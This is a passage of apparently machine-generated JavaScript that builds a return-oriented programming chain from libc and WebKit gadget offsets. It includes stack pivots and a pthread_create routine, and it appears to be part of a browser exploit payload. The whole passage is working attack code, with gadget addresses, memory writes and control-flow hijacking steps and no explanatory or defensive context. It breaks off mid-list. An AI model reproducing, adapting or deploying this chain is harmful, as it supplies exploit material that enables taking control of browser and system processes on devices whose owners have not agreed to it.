set_gadget(libc_base+144605,); //pop rdi
//L2074:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2075:
db([48, 0]); // 0x30
set_gadget(libc_base+759608,); //pop rax
//L2076:
db([0, 0]); // 0x0
set_gadgets([
libc_base+848070, //shl rax, cl
libc_base+848080, //shr rax, cl
libc_base+764760, //pop rsi
ropchain+1131392, //L2078
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1131408, //L2079
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1131376, //L2077
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2077:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2078:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2079:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1131512, //L2080
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1131528, //L2081
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2080:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2081:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1131648, //L2082
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1131632, //L2083
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2083:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2082:
db([0, 0]); // 0x0
set_gadgets([
libc_base+764760, //pop rsi
ropchain+1131736, //L2085
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760, //pop rsi
ropchain+1131720, //L2084
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2084:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2085:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1131840, //L2086
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1131856, //L2087
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+568675 //pop r8
]);
//L2086:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1131976, //L2088
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1131960, //L2089
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+759608 //pop rax
]);
//L2089:
db([0, 0]); // 0x0
set_gadget(libc_base+782311,); //pop rsp
//L2088:
db([0, 0]); // 0x0
//_pthread_create__rop:
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1132048, //L2090
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L2090:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1132112, //L2092
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
webkit_base+568675 //pop r8
]);
//L2092:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1132216, //L2094
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1132248, //L2096
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2094:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2095:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2096:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2097:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1132360, //L2099
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1132344, //L2098
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2098:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2099:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2100:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2101:
db([1, 0]); // 0x1
set_gadget(libc_base+763368,); //pop rcx
//L2102:
db([1, 0]); // 0x1
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2103:
db([1, 0]); // 0x1
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2105:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1132672, //L2106
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2106:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+105700, //or rax, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2108:
db([1, 0]); // 0x1
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2110:
db([2, 0]); // 0x2
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1132864, //L2111
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2111:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+105700, //or rax, rcx
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1132976, //L2113
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2113:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2114:
db([65536, 0]); // 0x10000
set_gadget(libc_base+759608,); //pop rax
//L2115:
db([65536, 0]); // 0x10000
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1133104, //L2117
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1133088, //L2116
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2116:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2117:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2118:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608, //pop rax
//L2120:
ropchain+1133256, //L2119
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+782311, //pop rsp
ropchain+1142048, //L2121
//L2119:
libc_base+853989, //mov rax, rcx
libc_base+764760 //pop rsi
]);
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1133352, //L2123
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2123:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1133408, //L2124
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2124:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2126:
db([65536, 0]); // 0x10000
set_gadget(libc_base+763368,); //pop rcx
//L2127:
db([65536, 0]); // 0x10000
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1133560, //L2129
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2129:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1133616, //L2130
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2130:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1133704, //L2133
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2132:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L2133:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+20307877, //mov [rax], rcx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2135:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L2136:
db([312, 0]); // 0x138
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2138:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1133888, //L2140
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1133904, //L2141
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2140:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2141:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1134064, //L2144
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1134096, //L2146
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1134048, //L2143
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1134080, //L2145
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2143:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2144:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2145:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2146:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1134192, //L2148
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1134176, //L2147
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2147:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2148:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2149:
db([1, 0]); // 0x1
set_gadget(libc_base+763368,); //pop rcx
//L2150:
db([1, 0]); // 0x1
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1134416, //L2152
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1134432, //L2153
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1134400, //L2151
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2151:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2152:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2153:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1134552, //L2156
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1134520, //L2154
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L2154:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2155:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L2156:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2158:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1134680, //L2160
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1134696, //L2161
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2160:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2161:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1134856, //L2164
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1134888, //L2166
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1134840, //L2163
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1134872, //L2165
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2163:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2164:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2165:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2166:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1134984, //L2168
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1134968, //L2167
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2167:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2168:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2170:
db([15, 0]); // 0xf
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1135096, //L2171
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2171:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
webkit_base+105700, //or rax, rcx
libc_base+764760, //pop rsi
ropchain+1135248, //L2174
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1135264, //L2175
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1135232, //L2173
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2173:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2174:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2175:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1135384, //L2178
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1135352, //L2176
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L2176:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2177:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L2178:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2180:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1135512, //L2182
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1135528, //L2183
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2182:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2183:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1135688, //L2186
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1135720, //L2188
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1135672, //L2185
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1135704, //L2187
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2185:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2186:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2187:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2188:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1135816, //L2190
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1135800, //L2189
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2189:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2190:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+759608 //pop rax
]);
//L2191:
db([1, 0]); // 0x1
set_gadget(libc_base+763368,); //pop rcx
//L2192:
db([1, 0]); // 0x1
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1136040, //L2194
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1136056, //L2195
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1136024, //L2193
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2193:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2194:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2195:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1136176, //L2198
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2757671, //mov rax, r9
libc_base+764760, //pop rsi
ropchain+1136144, //L2196
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+144605 //pop rdi
]);
//L2196:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
//L2197:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L2198:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
webkit_base+3488438, //mov [rax], ecx
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2200:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L2201:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1136320, //L2203
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1136336, //L2204
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2203:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2204:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1136480, //L2208
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1136448, //L2206
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1136464, //L2207
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L2206:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2207:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2208:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1136552, //L2210
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2210:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1136608, //L2211
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L2211:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1136704, //L2214
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L2213:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+763368,); //pop rcx
//L2214:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1136792, //L2216
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1136808, //L2217
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L2216:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2217:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224145, //mov eax, [rdi]
libc_base+764760, //pop rsi
ropchain+1136968, //L2220
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1137000, //L2222
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1136952, //L2219
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1136984, //L2221
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L2219:
db([0, 0]); // 0x0
set_gadget(libc_base+144605,); //pop rdi
//L2220:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L2221:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L2222:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+15691302, //movsxd rax, edi
libc_base+764760, //pop rsi
ropchain+1137128, //L2224
